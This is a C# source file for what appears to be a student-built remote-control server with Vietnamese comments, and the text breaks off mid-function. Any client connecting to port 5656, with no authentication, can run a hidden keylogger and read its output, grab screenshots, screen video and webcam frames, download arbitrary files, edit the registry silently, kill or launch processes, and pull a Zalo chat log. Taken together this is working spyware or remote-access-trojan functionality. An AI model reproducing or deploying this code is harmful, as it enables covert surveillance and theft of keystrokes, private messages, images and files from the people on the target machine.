using AForge.Video;
using AForge.Video.DirectShow;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using Microsoft.Win32;
using System.IO;
using System.Diagnostics;
using System.Drawing.Imaging;
using KeyLogger;
using System.Threading;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Automation;

namespace server
{
    public partial class server : Form
    {
        Thread tklog;
        FilterInfoCollection videoDevices;
        VideoCaptureDevice videoSource;
        DateTime lastSendTime = DateTime.MinValue;
        PerformanceCounter cpuCounter;
        PerformanceCounter ramCounter;
        
        
        public server()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;

            cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");
            ramCounter = new PerformanceCounter("Memory", "% Committed Bytes In Use");
            cpuCounter.NextValue(); // Gọi lần đầu luôn trả về 0
        
            tklog = new Thread(new ThreadStart(KeyLogger.InterceptKeys.startKLog));
            tklog.SetApartmentState(ApartmentState.STA); 
            tklog.IsBackground = true; 
            tklog.Start();

            KeyLogger.appstart.isRecording = false;
    
        }
        public void receiveSignal(ref String s)
        {
            try
            {
                s=Program.nr.ReadLine();
            }
            catch (Exception ex)
            {
                s = "QUIT";
            }
        }
        public void shutdown()
        {
            System.Diagnostics.Process.Start("ShutDown", "-s");
        }

        // 1. Nhập thư viện hệ thống để gọi lệnh khóa màn hình
        [DllImport("user32.dll")]
        public static extern bool LockWorkStation();


        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Unicode)] 
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport("user32.dll")]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);

        // 2. Hàm xử lý khóa máy an toàn
        public void lockSystem()
        {
            try 
            {
                // Gọi API của Windows để khóa màn hình ngay lập tức (Về màn hình đăng nhập)
                LockWorkStation(); 
            } 
            catch (Exception ex) 
            {
                // Nếu lỗi thì bỏ qua, không làm crash server
            }
        }


        public RegistryKey baseRegistryKey(ref String link)
        {
            RegistryKey a = null;
            if (link.IndexOf('\\') >= 0) 
            switch (link.Substring(0,link.IndexOf('\\')).ToUpper())
            {
                case "HKEY_CLASSIES_ROOT": a = Registry.ClassesRoot; break;
                case "HKEY_CURRENT_USER": a = Registry.CurrentUser; break;
                case "HKEY_LOCAL_MACHINE": a = Registry.LocalMachine; break;
                case "HKEY_USERS": a = Registry.Users; break;
                case "HKEY_CURRENT_CONFIG": a = Registry.CurrentConfig; break;
            }
            return a;
        }

        public void monitor()
        {
            try
            {
                // 1. CPU (%)
                float cpu = cpuCounter.NextValue();

                // 2. RAM (Tính toán Used/Total)
                float ramPercent = ramCounter.NextValue(); // Ví dụ: 60%
                
                // Lấy lượng RAM còn trống (Available MBytes)
                PerformanceCounter ramAvailCounter = new PerformanceCounter("Memory", "Available MBytes");
                float ramAvailMB = ramAvailCounter.NextValue(); // Ví dụ: 4000MB
                
                // Công thức ngược: Total = Available / (100% - Usage%)
                // Ví dụ: Còn 4000MB (40%) -> Total = 4000 / 0.4 = 10000MB
                float ramTotalMB = 0;
                if (ramPercent < 100) {
                    ramTotalMB = ramAvailMB / ((100 - ramPercent) / 100);
                } else {
                    ramTotalMB = ramAvailMB; // Tránh chia cho 0
                }
                
                float ramUsedMB = ramTotalMB - ramAvailMB;

                // 3. DISK (Ổ C:)
                DriveInfo d = new DriveInfo("C");
                long diskTotalGB = d.TotalSize / 1024 / 1024 / 1024;
                long diskFreeGB = d.TotalFreeSpace / 1024 / 1024 / 1024;
                long diskUsedGB = diskTotalGB - diskFreeGB;
                int diskPercent = (int)((double)diskUsedGB / diskTotalGB * 100);

                // Gửi chuỗi: CPU | RAM_Used | RAM_Total | Disk_Used | Disk_Total
                // Làm tròn số RAM về GB (1 số lẻ)
                string ramU = (ramUsedMB / 1024).ToString("0.0");
                string ramT = (ramTotalMB / 1024).ToString("0.0");

                string data = ((int)cpu) + "|" + ramU + "|" + ramT + "|" + diskUsedGB + "|" + diskTotalGB;
                
                Program.nw.WriteLine(data);
                Program.nw.Flush();
            }
            catch 
            { 
                Program.nw.WriteLine("0|0|0|0|0"); Program.nw.Flush(); 
            }
        }

        public void listInstalledApps()
        {
            try
            {
                // Danh sách các đường dẫn Start Menu
                string[] paths = {
                    Environment.GetFolderPath(Environment.SpecialFolder.CommonStartMenu), // All Users
                    Environment.GetFolderPath(Environment.SpecialFolder.StartMenu)       // Current User
                };

                List<string> appNames = new List<string>();

                foreach (string root in paths)
                {
                    if (Directory.Exists(root))
                    {
                        // Quét tất cả file .lnk (Shortcut)
                        string[] files = Directory.GetFiles(root, "*.lnk", SearchOption.AllDirectories);
                        foreach (string f in files)
                        {
                            string name = Path.GetFileNameWithoutExtension(f);
                            if (!appNames.Contains(name)) // Tránh trùng lặp
                            {
                                appNames.Add(name);
                            }
                        }
                    }
                }

                // Gửi số lượng
                Program.nw.WriteLine(appNames.Count.ToString());
                Program.nw.Flush();

                // Gửi tên từng App
                foreach (string name in appNames)
                {
                    Program.nw.WriteLine(name);
                    Program.nw.Flush();
                }
            }
            catch 
            { 
                Program.nw.WriteLine("0"); Program.nw.Flush(); 
            }
        }


        public String getvalue(ref RegistryKey a,ref String link,ref String valueName)
        {
            a=a.OpenSubKey(link);
            if (a == null) return "Lỗi";
            Object op = a.GetValue(valueName);
            if (op != null)
            {
                String s = "";
                if (a.GetValueKind(valueName) == RegistryValueKind.MultiString)
                {
                    String[] ss = (String[])op;

                    for (int i = 0; i < ss.Length; i++)
                        s += ss[i]+" ";
                    
                }
                else
                    if (a.GetValueKind(valueName) == RegistryValueKind.Binary)
                    {
                        Byte[] ss = (Byte[])op;
                        for (int i = 0; i < ss.Length; i++)
                            s += ss[i]+" ";
                    }
                    else s = Convert.ToString(op);
                return s;
            }
            else return "Lỗi";
        }
        public String setvalue(ref RegistryKey a,ref String link, ref String valueName, ref String value, ref String typeValue)
        {
            try
            {
                a = a.OpenSubKey(link, true);
            }
            catch (Exception ex)
            {
                return "Lỗi";
            }
            if (a == null) return "Lỗi";
            RegistryValueKind kind=RegistryValueKind.String;
            switch (typeValue)
            {
                case "String": kind = RegistryValueKind.String; break;
                case "Binary": kind = RegistryValueKind.Binary; break;
                case "DWORD": kind = RegistryValueKind.DWord; break;
                case "QWORD": kind = RegistryValueKind.QWord; break;
                case "Multi-String": kind = RegistryValueKind.MultiString; break;
                case "Expandable String": kind = RegistryValueKind.ExpandString; break;
                default: return "Lỗi";
            }
            Object v=value;
            //Registry.SetValue(link, valueName, v, kind);
            try
            {
                a.SetValue(valueName, v, kind);
            }
            catch (Exception ex)
            {
                return "Lỗi";
            }
            return "Set value thành công";
        }
        public void fileManager()
        {
            String ss = "";
            while (true)
            {
                receiveSignal(ref ss); // Chờ lệnh
                switch (ss)
                {
                    case "GET_DRIVES":
                        {
                            try
                            {
                                DriveInfo[] drives = DriveInfo.GetDrives();
                                Program.nw.WriteLine(drives.Length.ToString()); // Gửi số lượng ổ đĩa
                                Program.nw.Flush();

                                foreach (DriveInfo d in drives)
                                {
                                    if (d.IsReady)
                                        Program.nw.WriteLine(d.Name + "|DRIVE|" + d.TotalSize);
                                    else
                                        Program.nw.WriteLine(d.Name + "|DRIVE|0");
                                    Program.nw.Flush();
                                }
                            }
                            catch { Program.nw.WriteLine("0"); Program.nw.Flush(); }
                            break;
                        }

                    case "GET_DIR":
                        {
                            string path = Program.nr.ReadLine(); // Nhận đường dẫn
                            try
                            {
                                DirectoryInfo di = new DirectoryInfo(path);
                                FileSystemInfo[] files = di.GetFileSystemInfos(); // Lấy cả File và Folder
                                
                                Program.nw.WriteLine(files.Length.ToString()); // Gửi số lượng
                                Program.nw.Flush();

                                foreach (FileSystemInfo f in files)
                                {
                                    string type = (f.Attributes & FileAttributes.Directory) == FileAttributes.Directory ? "FOLDER" : "FILE";
                                    string size = "0";
                                    
                                    // Nếu là File thì lấy dung lượng
                                    if (type == "FILE")
                                    {
                                        try { size = ((FileInfo)f).Length.ToString(); } catch { }
                                    }

                                    // Gửi: Tên|Loại|Kích thước
                                    Program.nw.WriteLine(f.Name + "|" + type + "|" + size);
                                    Program.nw.Flush();
                                }
                            }
                            catch 
                            { 
                                // Nếu lỗi (ví dụ không có quyền truy cập), gửi 0
                                Program.nw.WriteLine("0"); Program.nw.Flush(); 
                            }
                            break;
                        }
                    case "DOWNLOAD":
                    {
                        // 1. Nhận đường dẫn file cần tải
                        string path = Program.nr.ReadLine();
                        
                        if (File.Exists(path))
                        {
                            try
                            {
                                // 2. Gửi kích thước file trước
                                long fileSize = new FileInfo(path).Length;
                                Program.nw.WriteLine(fileSize.ToString());
                                Program.nw.Flush();

                                // 3. Gửi dữ liệu file (Chia nhỏ từng cục 4KB để gửi)
                                using (FileStream fs = new FileStream(path, FileMode.Open, FileAccess.Read))
                                {
                                    byte[] buffer = new byte[4096]; // 4KB Buffer
                                    int bytesRead;
                                    while ((bytesRead = fs.Read(buffer, 0, buffer.Length)) > 0)
                                    {
                                        Program.client.Send(buffer, 0, bytesRead, SocketFlags.None);
                                    }
                                }
                            }
                            catch 
                            { 
                                // Nếu đang gửi mà lỗi (file bị khóa, mất mạng...)
                            }
                        }
                        else
                        {
                            // Báo lỗi: Gửi kích thước 0
                            Program.nw.WriteLine("0");
                            Program.nw.Flush();
                        }
                        break;
                    }
                    case "QUIT": return;
                }
            }
        }

        public void monitorActiveApp()
        {
            try
            {
                IntPtr hwnd = GetForegroundWindow();
                // Nếu không có cửa sổ nào (ví dụ màn hình khóa), gửi Unknown
                if (hwnd == IntPtr.Zero) {
                    Program.nw.WriteLine("Unknown|System");
                    Program.nw.Flush();
                    return;
                }

                uint pid;
                GetWindowThreadProcessId(hwnd, out pid);
                Process p = Process.GetProcessById((int)pid);

                StringBuilder title = new StringBuilder(512);
                GetWindowText(hwnd, title, title.Capacity);

                // Gửi: Tên Process | Tiêu đề cửa sổ
                string data = p.ProcessName + "|" + title.ToString();
                Program.nw.WriteLine(data);
                Program.nw.Flush();
            }
            catch 
            {
                Program.nw.WriteLine("Unknown|Error");
                Program.nw.Flush();
            }
        }


        public void webcam()
        {
            String ss = "";
            bool isRecording = false;

            // 1. Tìm thiết bị Camera
            try 
            {
                videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                if (videoDevices.Count == 0)
                {
                    // MessageBox.Show("Không tìm thấy Webcam!");
                    return;
                }
                // Lấy cam đầu tiên
                videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);
                
                // Đăng ký sự kiện: Khi có ảnh mới -> Gọi hàm NewFrame_Handler
                videoSource.NewFrame += new NewFrameEventHandler(NewFrame_Handler);
            }
            catch { return; }

            while (true)
            {
                receiveSignal(ref ss); // Chờ lệnh từ Client

                if (ss == "START")
                {
                    if (!videoSource.IsRunning)
                    {
                        videoSource.Start(); // Bắt đầu quay
                        isRecording = true;
                    }
                }
                else if (ss == "STOP")
                {
                    if (videoSource.IsRunning)
                    {
                        videoSource.SignalToStop(); // Dừng quay
                        isRecording = false;
                        // Gửi báo hiệu đã dừng
                        try {
                            Program.nw.WriteLine("STOPPED");
                            Program.nw.Flush();
                        } catch {}
                    }
                }
                else if (ss == "QUIT")
                {
                    if (videoSource.IsRunning) videoSource.Stop();
                    return; // Thoát hàm
                }
            }
        }

        // Hàm này tự động chạy mỗi khi Camera bắt được 1 khung hình
        private void NewFrame_Handler(object sender, NewFrameEventArgs eventArgs)
        {
            try
            {
                // Giới hạn FPS: Chỉ gửi nếu đã qua 50ms (tránh nghẽn mạng LAN)
                if ((DateTime.Now - lastSendTime).TotalMilliseconds < 50) return;
                lastSendTime = DateTime.Now;

                // Clone và Resize ảnh
                using (Bitmap original = (Bitmap)eventArgs.Frame.Clone())
                {
                    // Resize xuống 480px để nhẹ mạng (Wifi thường yếu hơn dây)
                    int newWidth = 480;
                    int newHeight = (original.Height * newWidth) / original.Width;
                    using (Bitmap resized = new Bitmap(original, newWidth, newHeight))
                    {
                        using (MemoryStream ms = new MemoryStream())
                        {
                            // Nén JPEG chất lượng 50%
                            ImageCodecInfo jpgEncoder = GetEncoder(ImageFormat.Jpeg);
                            System.Drawing.Imaging.Encoder myEncoder = System.Drawing.Imaging.Encoder.Quality;
                            EncoderParameters myEncoderParameters = new EncoderParameters(1);
                            myEncoderParameters.Param[0] = new EncoderParameter(myEncoder, 50L);

                            resized.Save(ms, jpgEncoder, myEncoderParameters);
                            byte[] buffer = ms.ToArray();

                            // --- ĐOẠN QUAN TRỌNG NHẤT: GỬI QUA MẠNG ---
                            lock (Program.client) 
                            {
                                // 1. Gửi Header kích thước (Dạng chuỗi byte, kết thúc bằng \n)
                                // Tuyệt đối KHÔNG dùng Program.nw.WriteLine ở đây để tránh lệch buffer
                                string header = buffer.Length.ToString() + "\n";
                                byte[] headerBytes = Encoding.ASCII.GetBytes(header);
                                Program.client.Send(headerBytes);

                                // 2. Gửi dữ liệu ảnh
                                Program.client.Send(buffer);
                            }
                            // ------------------------------------------
                        }
                    }
                }
            }
            catch 
            {
                // Lỗi thì bỏ qua frame này, không crash server
            }
        }


        public String deletevalue(ref RegistryKey a,ref String link, ref String valueName)
        {
            try
            {
                a = a.OpenSubKey(link, true);
            }
            catch (Exception ex)
            {
                return "Lỗi";
            }
            if (a == null) return "Lỗi";
            bool test = false ;
            a.DeleteValue(valueName,test);
            if (!test)
                return "Xóa value thành công";
            return "Lỗi";

        }
        public String deletekey(ref RegistryKey a, ref String link)
        {
            bool test = false;
            a.DeleteSubKey(link, test);
            if (!test)
                return "Xóa key thành công";
            else return "Lỗi";
        }
        public void registry()
        {
            String s="";
            FileStream fs = new FileStream("fileReg.reg", FileMode.Create);
            fs.Close();

            while (true)
            {
                receiveSignal(ref s);
                switch (s)
                {

                    case "REG":
                        {
                            Char[] data=new Char[5000];
                            Program.nr.Read(data,0,5000);
                            s = new String(data);
                            StreamWriter fin = new StreamWriter("fileReg.reg");
                            fin.Write(s);
                            fin.Close();
                            s = Application.StartupPath + "\\fileReg.reg";
                            bool test = true;
                            try
                            {
                                Process regeditPro = Process.Start("regedit.exe", "/s " + "\"" + s + "\"");
                                regeditPro.WaitForExit(20);
                            }
                            catch (Exception ex)
                            {
                                test = true;
                            }
                            if (test)
                                Program.nw.WriteLine("Sửa thành công");
                            else Program.nw.WriteLine("Sửa thất bại");
                            Program.nw.Flush();
                            break;
                        }
                    case "QUIT":
                        {
                            return; 
                        }
                    case "SEND":
                        {
                            String option="";
                            String link = "";
                            String valueName = "";
                            String value = "";
                            String typeValue = "";
                            option = Program.nr.ReadLine();
                            link = Program.nr.ReadLine();
                            valueName = Program.nr.ReadLine();
                            value = Program.nr.ReadLine();
                            typeValue = Program.nr.ReadLine();

                            RegistryKey a = baseRegistryKey(ref link);
                            String link2 = link.Substring(link.IndexOf('\\') + 1);
                            if (a == null)
                            s = "Lỗi";
                            else
                            {
                            
                                switch (option)
                                {
                                    case "Create key":{ a=a.CreateSubKey(link2);s="Tạo key thành công";break;}
                                    case "Delete key":s=deletekey(ref a,ref link2);break;
                                    case "Get value": s = getvalue(ref a,ref link2, ref valueName); break;
                                    case "Set value": s = setvalue(ref a,ref link2, ref valueName, ref value, ref typeValue); break;
                                    case "Delete value": s = deletevalue(ref a,ref link2, ref valueName); break;
                                    default: s = "Lỗi"; break;
                                }
                            }
                            Program.nw.WriteLine(s);
                            Program.nw.Flush();
                            break;
                        }
                }   
            }
        }
        public void takepic()
        {
            String ss="";
            
            while (true)
            {
                receiveSignal(ref ss);
                switch(ss)
                {
                    case "TAKE":
                        {
                            Bitmap bmpScreenshot;
                            Graphics gfxScreenshot;
                            bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
                            // Create a graphics object from the bitmap  
                            gfxScreenshot = Graphics.FromImage(bmpScreenshot);
                            // Take the screenshot from the upper left corner to the right bottom corner  
                            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
                            // Save the screenshot to the specified path that the user has chosen  
                           
                            MemoryStream ms = new MemoryStream();
                            bmpScreenshot.Save(ms, ImageFormat.Bmp);
                            ms.Close();

                            String s = Convert.ToString(ms.ToArray().Length);
                            Program.nw.WriteLine(s);Program.nw.Flush();
                            Program.client.Send(ms.ToArray());
                            break;
                        }
                    case "QUIT":
                        {
                            return; break;
                        }
                }
            }
        }
        
        public void hookKey(ref Thread tklog)
        {
            tklog.Resume();
            File.WriteAllText(appstart.path,"");
        }
        public void unhook(ref Thread tklog)
        {
            tklog.Suspend();
        }
        public void printkeys()
        {
            String s = "";
            s = File.ReadAllText(appstart.path);
            File.WriteAllText(appstart.path,"");
            if (s == "")
                s = "\0";
            Program.nw.Write(s); Program.nw.Flush();
        }
       
        public void keylog()
        {
            String s = "";
            while (true)
            {
                receiveSignal(ref s);
                switch (s)
                {
                    case "HOOK": 
                        KeyLogger.appstart.isRecording = true; // Bật ghi
                        try { File.WriteAllText(KeyLogger.appstart.path, ""); } catch {}
                        break;
                    case "UNHOOK": 
                        KeyLogger.appstart.isRecording = false; // Tắt ghi
                        break;
                    case "PRINT":
                        String content = "";
                        try 
                        { 
                            if (File.Exists(KeyLogger.appstart.path)) 
                            {
                                // SỬA: Dùng FileStream với FileShare.ReadWrite để không bị lỗi khi Hook đang ghi
                                using (FileStream fs = new FileStream(KeyLogger.appstart.path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                                using (StreamReader sr = new StreamReader(fs))
                                {
                                    content = sr.ReadToEnd();
                                }
                            } 
                        } 
                        catch {}
                        
                        if (content == "") content = "[Trong]";
                        Program.nw.Write(content); 
                        Program.nw.Flush();
                        break;

                    case "CLEAR":
                        try { 
                            File.WriteAllText(KeyLogger.appstart.path, ""); // Xóa trắng file
                            Program.nw.WriteLine("OK"); // Gửi phản hồi
                            Program.nw.Flush();
                        } catch {
                            Program.nw.WriteLine("ERR"); 
                            Program.nw.Flush();
                        }
                        break;
                    case "QUIT": return; // Chỉ return, không Abort thread
                }
            }
        }
        public void application()
        {
            String ss = "";
            System.Diagnostics.Process[] pr;
            pr = System.Diagnostics.Process.GetProcesses();
            while (true)
            {
                receiveSignal(ref ss);
                switch (ss)
                {
                    case "XEM":
                        {
                            string u = "";
                            string s = "";
                            pr = System.Diagnostics.Process.GetProcesses();
                            int soprocess = pr.GetLength(0);
                            u = soprocess.ToString();
                            Program.nw.WriteLine(u);Program.nw.Flush();
                            foreach (System.Diagnostics.Process p in pr)
                            {
                                u = "";
                                if (p.MainWindowTitle.Length > 0)
                                {

                                    u = "ok";

                                }
                                Program.nw.WriteLine(u); Program.nw.Flush();
                                if (u == "ok")
                                {
                                    u = p.ProcessName;
                                    Program.nw.WriteLine(u); Program.nw.Flush();

                                    u = p.Id.ToString();
                                    Program.nw.WriteLine(u); Program.nw.Flush();

                                    u = p.Threads.Count.ToString();
                                    Program.nw.WriteLine(u); Program.nw.Flush();

                                    long mem = p.WorkingSet64 / 1024 / 1024; // Đổi sang MB
                                    Program.nw.WriteLine(mem.ToString() + " MB"); 
                                    Program.nw.Flush();
                                    
                                }
                            }
                               
                        }
                        break;
                    case "KILL":
                        {
                            bool test=true;
                            while (test)
                            {
                                receiveSignal(ref ss);
                                switch (ss)
                                {

                                    case "KILLID":
                                        {
                                            string u = "";
                                            u = Program.nr.ReadLine();
                                            bool test2 = false;
                                            if (u != "")
                                                foreach (System.Diagnostics.Process p in pr)
                                                if (p.MainWindowTitle.Length > 0)
                                                {
                                                    if (p.Id.ToString() == u)
                                                    {
                                                        try
                                                        {
                                                            p.Kill();
                                                            Program.nw.WriteLine("Đã diệt chương trình"); Program.nw.Flush();

                                                        }
                                                        catch (Exception ex)
                                                        { Program.nw.WriteLine("Lỗi"); Program.nw.Flush(); }
                                                        test2 = true;
                                                    }
                                                }
                                            if (!test2)
                                            { Program.nw.WriteLine("Không tìm thấy chương trình"); Program.nw.Flush(); }
                                            break;
                                        }
                                     case "QUIT": test = false; break;
                                                          
                                }
                            }
                        }
                        break;
                    case "START":
                     {
                            bool test = true;
                            while (test)
                            {
                                receiveSignal(ref ss);
                                switch (ss)
                                {
                                    case "STARTID":
                                        {
                                            String u = "";
                                            u = Program.nr.ReadLine();
                                            if (u != "")
                                            {
                                                u += ".exe";
                                                //System.Diagnostics.Process t= new Process();
                                                try
                                                {
                                                    Process.Start(u);
                                                    Program.nw.WriteLine("Chương trình đã được bật"); Program.nw.Flush();
                                                }
                                                catch (Exception ex)
                                                {
                                                    Program.nw.WriteLine("Lỗi"); Program.nw.Flush();
                                                }
                                                break;
                                                //p.Start();
                                            }
                                            Program.nw.WriteLine("Lỗi"); Program.nw.Flush();
                                            break;
                                        }
                                    case "QUIT": test = false; break;
                                }

                            }
                        }
                        break;
                    case "QUIT":
                        {
                            return;
                        }

                }
            }

        }

        public void getZaloLog()
        {
            try
            {
                // Đường dẫn file log mà hàm Hook đang ghi vào
                string logPath = Path.Combine(Path.GetTempPath(), "zalo_log.txt");

                if (File.Exists(logPath))
                {
                    // 1. Gửi kích thước file
                    long len = new FileInfo(logPath).Length;
                    Program.nw.WriteLine(len.ToString());
                    Program.nw.Flush();

                    // 2. Gửi nội dung file
                    // Dùng FileShare.ReadWrite để đọc được ngay cả khi Hook đang ghi
                    using (FileStream fs = new FileStream(logPath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                    {
                        byte[] buffer = new byte[4096];
                        int bytesRead;
                        while ((bytesRead = fs.Read(buffer, 0, buffer.Length)) > 0)
                        {
                            Program.client.Send(buffer, 0, bytesRead, SocketFlags.None);
                        }
                    }
                }
                else
                {
                    Program.nw.WriteLine("0"); Program.nw.Flush();
                }
            }
            catch
            {
                Program.nw.WriteLine("0"); Program.nw.Flush();
            }
        }

        public void process()
        {
            String ss = "";
            System.Diagnostics.Process[] pr;
            pr = System.Diagnostics.Process.GetProcesses();
            while (true)
            {
                receiveSignal(ref ss);

                switch (ss)
                {
                    case "XEM":
                        {
                            string u = "";
                            string s = "";
                            pr = System.Diagnostics.Process.GetProcesses();
                            int soprocess = pr.GetLength(0);
                            u = soprocess.ToString();
                            Program.nw.WriteLine(u); Program.nw.Flush();
                            foreach (System.Diagnostics.Process p in pr)
                            {
                                u = p.ProcessName;
                                Program.nw.WriteLine(u); Program.nw.Flush();
                                u = p.Id.ToString();
                                Program.nw.WriteLine(u); Program.nw.Flush();
                                u = p.Threads.Count.ToString();
                                Program.nw.WriteLine(u); Program.nw.Flush();

                            }
                        }
                        break;
                    case "KILL":
                        {
                            bool test = true;
                            while (test)
                            {
                                receiveSignal(ref ss);
                                switch (ss)
                                {

                                    case "KILLID":
                                        {
                                            string u = "";
                                            u = Program.nr.ReadLine();
                                            bool test2 = false;
                                            if (u != "")
                                                foreach (System.Diagnostics.Process p in pr)
                                                {
                                                    if (p.Id.ToString() == u)
                                                    {
                                                        try
                                                        {
                                                            p.Kill();
                                                            Program.nw.WriteLine("Đã diệt process"); Program.nw.Flush();

                                                        }
                                                        catch (Exception ex)
                                                        { Program.nw.WriteLine("Lỗi"); Program.nw.Flush(); }
                                                        test2 = true;
                                                    }
                                                }
                                            if (!test2)
                                            { Program.nw.WriteLine("Lỗi"); Program.nw.Flush(); }
                                            break;
                                        }
                                    case "QUIT": test = false; break;

                                }
                            }
                        }
                        break;
                    case "START":
                        {
                            bool test = true;
                            while (test)
                            {
                                receiveSignal(ref ss);
                                switch (ss)
                                {
                                    case "STARTID":
                                        {
                                            String u = Program.nr.ReadLine(); // Nhận tên từ Client
                                            if (u != "")
                                            {
                                                try
                                                {
                                                    // CÁCH 1: Thử chạy trực tiếp (VD: nhập đường dẫn full hoặc app hệ thống)
                                                    Process.Start(u);
                                                    Program.nw.WriteLine("Đã mở trực tiếp: " + u);
                                                }
                                                catch
                                                {
                                                    // CÁCH 2: Nếu lỗi, thử thêm đuôi .exe
                                                    try 
                                                    {
                                                        if (!u.EndsWith(".exe")) Process.Start(u + ".exe");
                                                        else throw new Exception(); // Ném lỗi để nhảy sang cách 3
                                                        Program.nw.WriteLine("Đã mở (thêm .exe): " + u);
                                                    }
                                                    catch
                                                    {
                                                        // CÁCH 3: Tìm trong Start Menu (Dành cho Zalo, CodeBlocks...)
                                                        string shortcutPath = FindAppInStartMenu(u);
                                                        if (shortcutPath != null)
                                                        {
                                                            Process.Start(shortcutPath);
                                                            Program.nw.WriteLine("Đã tìm thấy và mở: " + Path.GetFileName(shortcutPath));
                                                        }
                                                        else
                                                        {
                                                            Program.nw.WriteLine("Lỗi: Không tìm thấy ứng dụng '" + u + "'");
                                                        }
                                                    }
                                                }
                                                Program.nw.Flush();
                                                break;
                                            }
                                            Program.nw.WriteLine("Lỗi Input rỗng"); Program.nw.Flush();
                                            break;
                                        }
                                    case "QUIT": test = false; break;
                                }
                            }
                        }
                        break;
                    case "QUIT":
                        {
                            return; break;
                        }
                }
            }

        }
        private void button1_Click(object sender, EventArgs e)
        {
            // Tạo một luồng riêng biệt để chạy Server
            Thread svThread = new Thread(new ThreadStart(StartServerLogic));
            
            // --- DÒNG QUAN TRỌNG NHẤT (NẾU THIẾU -> WEBCAM ĐEN/KHÔNG CÓ HÌNH) ---
            svThread.SetApartmentState(ApartmentState.STA); 
            // ---------------------------------------------------------------------
            
            svThread.IsBackground = true;
            svThread.Start();

            this.button1.Enabled = false;
            this.Text = "Server đang chạy...";
        }

        // Hàm chứa logic chính của Server (Tách ra cho gọn)
        void StartServerLogic()
        {
            IPEndPoint ip = new IPEndPoint(IPAddress.Any, 5656);
            Program.server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            
            try {
                Program.server.Bind(ip);
                Program.server.Listen(100);
            } 
            catch {
                MessageBox.Show("Cổng 5656 đang bận!"); return;
            }

            while (true)
            {
                Program.client = Program.server.Accept();
                Program.ns = new NetworkStream(Program.client);
                Program.nr = new StreamReader(Program.ns);
                Program.nw = new StreamWriter(Program.ns, Encoding.UTF8) { AutoFlush = true };
                
                String s = "";
                bool clientConnected = true;
                
                while (clientConnected)
                {
                    try 
                    {
                        receiveSignal(ref s);
                        switch (s)
                        {
                            case "KEYLOG": keylog(); break;
                            case "SHUTDOWN": shutdown(); break;

                            case "LOCK": lockSystem(); break;
                            
                            case "REGISTRY": registry(); break;
                            case "TAKEPIC": takepic(); break;
                            case "PROCESS": process(); break;
                            case "APPLICATION": application(); break;
                            case "VIDEO": video(); break;
                            case "WEBCAM": webcam(); break; // <--- Đảm bảo có dòng này
                            case "EXPLORER": fileManager(); break;
                            case "GET_INSTALLED": listInstalledApps(); break;
                            case "GET_ZALO_LOG": getZaloLog(); break;
                            case "MONITOR": monitor(); break;
                            case "GET_ACTIVE_APP": monitorActiveApp(); break;

                            case "QUIT": clientConnected = false; break;
                        }
                    }
                    catch { clientConnected = false; }
                }
                try { Program.client.Close(); } catch {}
            }
        }
        private string FindAppInStartMenu(string appName)
        {
            string[] paths = {
                Environment.GetFolderPath(Environment.SpecialFolder.CommonStartMenu), // Start Menu của toàn hệ thống
                Environment.GetFolderPath(Environment.SpecialFolder.StartMenu)       // Start Menu của User hiện tại
            };

            foreach (string root in paths)
            {
                if (!Directory.Exists(root)) continue;

                // Tìm tất cả file .lnk (Shortcut) trong thư mục Start Menu (bao gồm thư mục con)
                string[] files = Directory.GetFiles(root, "*.lnk", SearchOption.AllDirectories);
                
                foreach (string file in files)
                {
                    string fileName = Path.GetFileNameWithoutExtension(file);
                    // So sánh tên (không phân biệt hoa thường)
                    if (fileName.Equals(appName, StringComparison.OrdinalIgnoreCase) || 
                        fileName.ToLower().Contains(appName.ToLower()))
                    {
                        return file; // Trả về đường dẫn shortcut tìm thấy
                    }
                }
            }
            return null;
        }
        public void video()
        {
            String ss = "";
            bool isRecording = false;
            DateTime stopTime = DateTime.MaxValue; 

            while (true)
            {
                if (!isRecording)
                {
                    // Chờ lệnh START hoặc QUIT
                    receiveSignal(ref ss); 
                    
                    if (ss.StartsWith("START"))
                    {
                        isRecording = true;
                        string[] parts = ss.Split(' ');
                        if (parts.Length > 1)
                        {
                            int seconds = 0;
                            if (int.TryParse(parts[1], out seconds)) 
                                stopTime = DateTime.Now.AddSeconds(seconds);
                        }
                        else 
                        {
                            stopTime = DateTime.MaxValue; 
                        }
                    }
                    else if (ss == "QUIT") 
                    {
                        return; // Thoát khỏi hàm video
                    }
                }
                else
                {
                    // ĐANG QUAY VIDEO
                    try
                    {
                        // --- SỬA ĐOẠN NÀY ĐỂ KHÔNG BỊ CẮT HÌNH (Full Screen thật sự) ---
                        int width = System.Windows.Forms.SystemInformation.VirtualScreen.Width;
                        int height = System.Windows.Forms.SystemInformation.VirtualScreen.Height;
                        int left = System.Windows.Forms.SystemInformation.VirtualScreen.Left;
                        int top = System.Windows.Forms.SystemInformation.VirtualScreen.Top;

                        Bitmap bmp = new Bitmap(width, height);
                        Graphics g = Graphics.FromImage(bmp);
                        g.CopyFromScreen(left, top, 0, 0, bmp.Size, CopyPixelOperation.SourceCopy);
                        // -------------------------------------------------------------

                        // 2. Nén ảnh JPEG (Chất lượng 50%)
                        MemoryStream ms = new MemoryStream();
                        ImageCodecInfo jpgEncoder = GetEncoder(ImageFormat.Jpeg);
                        System.Drawing.Imaging.Encoder myEncoder = System.Drawing.Imaging.Encoder.Quality;
                        EncoderParameters myEncoderParameters = new EncoderParameters(1);
                        EncoderParameter myEncoderParameter = new EncoderParameter(myEncoder, 50L); 
